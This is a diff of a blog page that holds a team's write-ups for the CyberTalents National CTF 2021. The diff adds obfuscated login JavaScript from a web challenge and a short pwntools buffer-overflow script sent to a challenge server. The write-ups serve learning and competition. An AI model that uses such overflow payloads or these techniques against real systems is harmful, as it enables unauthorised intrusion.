@@ -103,7 +103,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "655"
+    "wordCount": "881"
   }]
   </script>
 
@@ -305,7 +305,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2021-09-12 11:01:27.242 &#43;0000 UTC">12 September 2021</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+      <time datetime="2021-09-12 11:01:27.242 &#43;0000 UTC">12 September 2021</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
     
 
     
@@ -335,17 +335,13 @@
   <ul>
     <li>
       <ul>
-        <li>
-          <ul>
-            <li><a href="#argos-web-50-pts">Argos-web 50 pts</a></li>
-            <li><a href="#missing-person-osint-50-pts"><strong>Missing person-osint 50 pts</strong></a></li>
-            <li><a href="#laggy-decoder-secure-coding-100pts">Laggy Decoder-secure coding 100pts</a></li>
-            <li><a href="#64rev-cryptography-100pts">64rev-cryptography 100pts</a></li>
-            <li><a href="#red-pipe--machines-100pts"><strong>Red pipe -machines 100pts</strong></a></li>
-            <li><a href="#roony-forensics-100pts">Roony-forensics 100pts</a></li>
-            <li><a href="#ch4nger-exploitation-50-pts-easy">Ch4nger —Exploitation 50 pts easy</a></li>
-          </ul>
-        </li>
+        <li><a href="#argos-web-50-pts">Argos-web 50 pts</a></li>
+        <li><a href="#missing-person-osint-50-pts">Missing person-osint 50 pts</a></li>
+        <li><a href="#laggy-decoder-secure-coding-100pts">Laggy Decoder-secure coding 100pts</a></li>
+        <li><a href="#64rev-cryptography-100pts">64rev-cryptography 100pts</a></li>
+        <li><a href="#red-pipe--machines-100pts">Red pipe -machines 100pts</a></li>
+        <li><a href="#roony-forensics-100pts">Roony-forensics 100pts</a></li>
+        <li><a href="#ch4nger-exploitation-50-pts-easy">Ch4nger —Exploitation 50 pts easy</a></li>
       </ul>
     </li>
   </ul>
@@ -373,12 +369,50 @@
 </p>
 <p>My team and I recently took place in the CyberTalents National CTF 2021 where we emerged 1st in Kenya :) We managed to solve all challenges but one. Here are some of the writeups for the challenges we solved</p>
 <p>Since the challenges are down, I will try my best to reconstruct the solutions</p>
-<h4 id="argos-web-50-pts" class="relative group">Argos-web 50 pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#argos-web-50-pts" aria-label="Anchor">#</a></span></h4>
+<h3 id="argos-web-50-pts" class="relative group">Argos-web 50 pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#argos-web-50-pts" aria-label="Anchor">#</a></span></h3>
 <p>Argos was an ‘easy’ rated challenge, well some may tend to disagree :) This challenge was solved by @<a href="https://twitter.com/k0imet_">k0imet</a></p>
 <p>First step involved a directory bruteforce on the challenge link, which gave us a directory <strong>java.php .</strong> This page contained some obfuscated javascript that handled the authentication.</p>
-<p>The important function to look at is <strong>check</strong>. Towards the end a comparison is made and an alert is given. The alert was the error message shown if the login was correct or incorrect. We also have an array of strings and in the array is a string called ‘CT2021’</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="s1">&#39;use strict&#39;</span><span class="p">;</span>
+
+<span class="kd">function</span> <span class="nx">_0x267a</span><span class="p">(</span><span class="nx">_0x29ae1d</span><span class="p">,</span> <span class="nx">_0x59beb8</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">_0x2dca0b</span> <span class="o">=</span> <span class="nx">_0x2dca</span><span class="p">();</span>
+  <span class="k">return</span> <span class="nx">_0x267a</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">_0x267a3d</span><span class="p">,</span> <span class="nx">_0x79f9b7</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">_0x267a3d</span> <span class="o">=</span> <span class="nx">_0x267a3d</span> <span class="o">-</span> <span class="mh">0x116</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">_0x4cbcf2</span> <span class="o">=</span> <span class="nx">_0x2dca0b</span><span class="p">[</span><span class="nx">_0x267a3d</span><span class="p">];</span>
+    <span class="k">return</span> <span class="nx">_0x4cbcf2</span><span class="p">;</span>
+  <span class="p">},</span> <span class="nx">_0x267a</span><span class="p">(</span><span class="nx">_0x29ae1d</span><span class="p">,</span> <span class="nx">_0x59beb8</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kd">var</span> <span class="nx">_0x18eaa6</span> <span class="o">=</span> <span class="nx">_0x267a</span><span class="p">;</span>
+
+<span class="kd">function</span> <span class="nx">_0x2dca</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">_0x4a962f</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;556864LePYhO&#39;</span><span class="p">,</span> <span class="s1">&#39;93KGoDMv&#39;</span><span class="p">,</span> <span class="s1">&#39;wrong\x20Password&#39;</span><span class="p">,</span> <span class="s1">&#39;14665ltxznd&#39;</span><span class="p">,</span> <span class="s1">&#39;41121RGIWyS&#39;</span><span class="p">,</span> <span class="s1">&#39;50236HEZbSV&#39;</span><span class="p">,</span> <span class="s1">&#39;75OrlJRv&#39;</span><span class="p">,</span> <span class="s1">&#39;260kpgQAa&#39;</span><span class="p">,</span> <span class="s1">&#39;1316543gDJbid&#39;</span><span class="p">,</span> <span class="s1">&#39;80096jdpdhM&#39;</span><span class="p">,</span> <span class="s1">&#39;value&#39;</span><span class="p">,</span> <span class="s1">&#39;318iCKAiJ&#39;</span><span class="p">,</span> <span class="s1">&#39;17205968dLvimS&#39;</span><span class="p">,</span> <span class="s1">&#39;getElementById&#39;</span><span class="p">,</span> <span class="s1">&#39;CT2021&#39;</span><span class="p">,</span> <span class="s1">&#39;12SXIKHp&#39;</span><span class="p">,</span> <span class="s1">&#39;232oiseyT&#39;</span><span class="p">];</span>
+  <span class="nx">_0x2dca</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">_0x4a962f</span><span class="p">;</span>
+  <span class="p">};</span>
+  <span class="k">return</span> <span class="nx">_0x2dca</span><span class="p">();</span>
+<span class="p">}(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">_0x59e2bc</span><span class="p">,</span> <span class="nx">_0x3b27b9</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">_0x3463b2</span> <span class="o">=</span> <span class="nx">_0x267a</span><span class="p">,</span>
+    <span class="nx">_0x486916</span> <span class="o">=</span> <span class="nx">_0x59e2bc</span><span class="p">();</span>
+  <span class="k">while</span> <span class="p">(</span><span class="o">!!</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+      <span class="kd">var</span> <span class="nx">_0x4861c6</span> <span class="o">=</span> <span class="o">-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x3463b2</span><span class="p">(</span><span class="mh">0x120</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x1</span> <span class="o">+</span> <span class="o">-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x3463b2</span><span class="p">(</span><span class="mh">0x11d</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x2</span> <span class="o">*</span> <span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x3463b2</span><span class="p">(</span><span class="mh">0x119</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x3</span><span class="p">)</span> <span class="o">+</span> <span class="o">-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x3463b2</span><span class="p">(</span><span class="mh">0x121</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x4</span> <span class="o">*</span> <span class="p">(</span><span class="o">-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x3463b2</span><span class="p">(</span><span class="mh">0x11e</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x5</span><span class="p">)</span> <span class="o">+</span> <span class="o">-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x3463b2</span><span class="p">(</span><span class="mh">0x123</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x6</span> <span class="o">*</span> <span class="p">(</span><span class="o">-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x3463b2</span><span class="p">(</span><span class="mh">0x11b</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x7</span><span class="p">)</span> <span class="o">+</span> <span class="o">-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x3463b2</span><span class="p">(</span><span class="mh">0x117</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x8</span> <span class="o">*</span> <span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x3463b2</span><span class="p">(</span><span class="mh">0x11c</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0x9</span><span class="p">)</span> <span class="o">+</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x3463b2</span><span class="p">(</span><span class="mh">0x11f</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0xa</span> <span class="o">*</span> <span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x3463b2</span><span class="p">(</span><span class="mh">0x118</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0xb</span><span class="p">)</span> <span class="o">+</span> <span class="o">-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x3463b2</span><span class="p">(</span><span class="mh">0x116</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0xc</span> <span class="o">*</span> <span class="p">(</span><span class="o">-</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">_0x3463b2</span><span class="p">(</span><span class="mh">0x124</span><span class="p">))</span> <span class="o">/</span> <span class="mh">0xd</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">_0x4861c6</span> <span class="o">===</span> <span class="nx">_0x3b27b9</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+      <span class="k">else</span> <span class="nx">_0x486916</span><span class="p">[</span><span class="s1">&#39;push&#39;</span><span class="p">](</span><span class="nx">_0x486916</span><span class="p">[</span><span class="s1">&#39;shift&#39;</span><span class="p">]());</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">_0x3e62db</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">_0x486916</span><span class="p">[</span><span class="s1">&#39;push&#39;</span><span class="p">](</span><span class="nx">_0x486916</span><span class="p">[</span><span class="s1">&#39;shift&#39;</span><span class="p">]());</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}(</span><span class="nx">_0x2dca</span><span class="p">,</span> <span class="mh">0xc909d</span><span class="p">));</span>
+<span class="kd">var</span> <span class="nx">_0xae5b</span> <span class="o">=</span> <span class="p">[</span><span class="nx">_0x18eaa6</span><span class="p">(</span><span class="mh">0x122</span><span class="p">),</span> <span class="s1">&#39;user&#39;</span><span class="p">,</span> <span class="nx">_0x18eaa6</span><span class="p">(</span><span class="mh">0x125</span><span class="p">),</span> <span class="s1">&#39;pass&#39;</span><span class="p">,</span> <span class="nx">_0x18eaa6</span><span class="p">(</span><span class="mh">0x126</span><span class="p">),</span> <span class="s1">&#39;\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Congratz\x20\x0a\x0a&#39;</span><span class="p">,</span> <span class="nx">_0x18eaa6</span><span class="p">(</span><span class="mh">0x11a</span><span class="p">)];</span>
+
+<span class="kd">function</span> <span class="nx">check</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">_0x105bf3</span> <span class="o">=</span> <span class="nb">document</span><span class="p">[</span><span class="nx">_0xae5b</span><span class="p">[</span><span class="mh">0x2</span><span class="p">]](</span><span class="nx">_0xae5b</span><span class="p">[</span><span class="mh">0x1</span><span class="p">])[</span><span class="nx">_0xae5b</span><span class="p">[</span><span class="mh">0x0</span><span class="p">]],</span>
+    <span class="nx">_0xe27d13</span> <span class="o">=</span> <span class="nb">document</span><span class="p">[</span><span class="nx">_0xae5b</span><span class="p">[</span><span class="mh">0x2</span><span class="p">]](</span><span class="nx">_0xae5b</span><span class="p">[</span><span class="mh">0x3</span><span class="p">])[</span><span class="nx">_0xae5b</span><span class="p">[</span><span class="mh">0x0</span><span class="p">]];</span>
+  <span class="nx">_0x105bf3</span> <span class="o">==</span> <span class="nx">_0xae5b</span><span class="p">[</span><span class="mh">0x4</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">_0xe27d13</span> <span class="o">==</span> <span class="nx">_0xae5b</span><span class="p">[</span><span class="mh">0x4</span><span class="p">]</span> <span class="o">?</span> <span class="nx">alert</span><span class="p">(</span><span class="nx">_0xae5b</span><span class="p">[</span><span class="mh">0x5</span><span class="p">])</span> <span class="o">:</span> <span class="nx">alert</span><span class="p">(</span><span class="nx">_0xae5b</span><span class="p">[</span><span class="mh">0x6</span><span class="p">]);</span>
+<span class="p">};</span>
+</code></pre></div><p>The important function to look at is <strong>check</strong>. Towards the end a comparison is made and an alert is given. The alert was the error message shown if the login was correct or incorrect. We also have an array of strings and in the array is a string called ‘CT2021’</p>
 <p>This <a href="https://hackersdad.medium.com/cybertalents-ctf-this-is-sparta-write-up-adb1fd0263e9">writeup</a> has a similar challenge and we can find out which variables are being passed. CT2021 was the user and pass for the website, which upon login gives us the flag.</p>
-<h4 id="missing-person-osint-50-pts" class="relative group"><strong>Missing person-osint 50 pts</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#missing-person-osint-50-pts" aria-label="Anchor">#</a></span></h4>
+<h3 id="missing-person-osint-50-pts" class="relative group">Missing person-osint 50 pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#missing-person-osint-50-pts" aria-label="Anchor">#</a></span></h3>
 <p>In this challenge we had trace the most recent online activity of a missing person. We were given this <a href="https://bitly.com/3frKIAX">https://bitly.com/3frKIAX</a> link which led us to a twitter account with protected tweets.</p>
 <p>
 
@@ -441,7 +475,7 @@
   
 
 </p>
-<h4 id="laggy-decoder-secure-coding-100pts" class="relative group">Laggy Decoder-secure coding 100pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#laggy-decoder-secure-coding-100pts" aria-label="Anchor">#</a></span></h4>
+<h3 id="laggy-decoder-secure-coding-100pts" class="relative group">Laggy Decoder-secure coding 100pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#laggy-decoder-secure-coding-100pts" aria-label="Anchor">#</a></span></h3>
 <p>In this challenge, we needed to fix the source code provided. The data being passed to the function was not being sanitized and one could achieve some XSS</p>
 <p>Modify the utils file to . Submitting the modified code gives us the flag</p>
 <p>
@@ -458,9 +492,10 @@
   
 
 </p>
-<h4 id="64rev-cryptography-100pts" class="relative group">64rev-cryptography 100pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#64rev-cryptography-100pts" aria-label="Anchor">#</a></span></h4>
-<p>This solution was curated by @<a href="https://twitter.com/k0imet_">k0imet</a> and @<a href="https://twitter.com/mystic_kev">mystickev</a> . We are given a base64 encode string fdXU1Z2hSRwIzaHAxQ8zcjNIX3MxNUdqaWRmPT09XiNUdqaWRmPT09XihkZCUtVGhncz8lHJmIzmh1dGRyZ0Zmd2dlfV8zcjNIX3MxX3IzaHAxQ18zNXIzdjNSXzNscG0zNV97Z2FsZgZGRmNVxQ18zanNnaGZkYWhocaWRmPT0TWNkc2hdXU1Z2hSRwIzaHAxQ8zcjNIX3MxNfV9fM3IzSF9zMV9yM2hwMUNfMzVyM3YzUl8zbHBtMzVfX3tnYWxm==</p>
-<p>Using cyberchef to decode , you can pick out bits of the flag in the output i.e 1s_H3r3</p>
+<h3 id="64rev-cryptography-100pts" class="relative group">64rev-cryptography 100pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#64rev-cryptography-100pts" aria-label="Anchor">#</a></span></h3>
+<p>This solution was curated by @<a href="https://twitter.com/k0imet_">k0imet</a> and @<a href="https://twitter.com/mystic_kev">mystickev</a> . We are given a base64 encode string</p>
+<pre tabindex="0"><code>fdXU1Z2hSRwIzaHAxQ8zcjNIX3MxNUdqaWRmPT09XiNUdqaWRmPT09XihkZCUtVGhncz8lHJmIzmh1dGRyZ0Zmd2dlfV8zcjNIX3MxX3IzaHAxQ18zNXIzdjNSXzNscG0zNV97Z2FsZgZGRmNVxQ18zanNnaGZkYWhocaWRmPT0TWNkc2hdXU1Z2hSRwIzaHAxQ8zcjNIX3MxNfV9fM3IzSF9zMV9yM2hwMUNfMzVyM3YzUl8zbHBtMzVfX3tnYWxm==
+</code></pre><p>Using cyberchef to decode , you can pick out bits of the flag in the output i.e 1s_H3r3</p>
 <p>
 
 
@@ -491,7 +526,7 @@
 
 </p>
 <p>We get 2 flags. One of them was the answer</p>
-<h4 id="red-pipe--machines-100pts" class="relative group"><strong>Red pipe -machines 100pts</strong> <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#red-pipe--machines-100pts" aria-label="Anchor">#</a></span></h4>
+<h3 id="red-pipe--machines-100pts" class="relative group">Red pipe -machines 100pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#red-pipe--machines-100pts" aria-label="Anchor">#</a></span></h3>
 <p>For this challenge, we are given an IP for a machine. We need to gain a shell and get the flag.</p>
 <p>
 
@@ -552,7 +587,7 @@
   
 
 </p>
-<h4 id="roony-forensics-100pts" class="relative group">Roony-forensics 100pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#roony-forensics-100pts" aria-label="Anchor">#</a></span></h4>
+<h3 id="roony-forensics-100pts" class="relative group">Roony-forensics 100pts <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#roony-forensics-100pts" aria-label="Anchor">#</a></span></h3>
 <p>This was a simple forensics challenge that required us to utilize a registry explorer tool to find the most recent executed application</p>
 <p>After tons of googling. I found a tool called Registry Explorer that could simplify the solution. All I needed to do was supply a registry key to navigate the file hierachy as follows</p>
 <p>Load the hive file</p>
@@ -601,10 +636,29 @@
 
 </p>
 <p>The flag was gpedit.msc</p>
-<h4 id="ch4nger-exploitation-50-pts-easy" class="relative group">Ch4nger —Exploitation 50 pts easy <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ch4nger-exploitation-50-pts-easy" aria-label="Anchor">#</a></span></h4>
+<h3 id="ch4nger-exploitation-50-pts-easy" class="relative group">Ch4nger —Exploitation 50 pts easy <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ch4nger-exploitation-50-pts-easy" aria-label="Anchor">#</a></span></h3>
 <p>This solution was curated by my teammate @<a href="https://twitter.com/BinaryChunk">gilbert</a>. It is a simple buffer overflow challenge where we need to overwrite the return address with _0x_deadbeef</p>
 <p>We can solve the challenge using pwntools as follows</p>
-<p>These were the tricky challenges in the CTF and I hope you learned a thing or two. Follow like and share if you enjoyed :)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="ch">#!/usr/bin/python3</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
+
+
+<span class="n">filename</span> <span class="o">=</span> <span class="s2">&#34;./chall&#34;</span>
+
+<span class="c1">#io = process(filename)</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;3.122.102.231&#34;</span><span class="p">,</span> <span class="mi">6666</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;i386&#34;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+	<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">200</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+	<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+	<span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;The final flag is: </span><span class="se">\n\t</span><span class="s2"> </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">flag</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+	<span class="n">main</span><span class="p">()</span>
+</code></pre></div><p>These were the tricky challenges in the CTF and I hope you learned a thing or two. Follow like and share if you enjoyed :)</p>
 
       </div>
     </section>
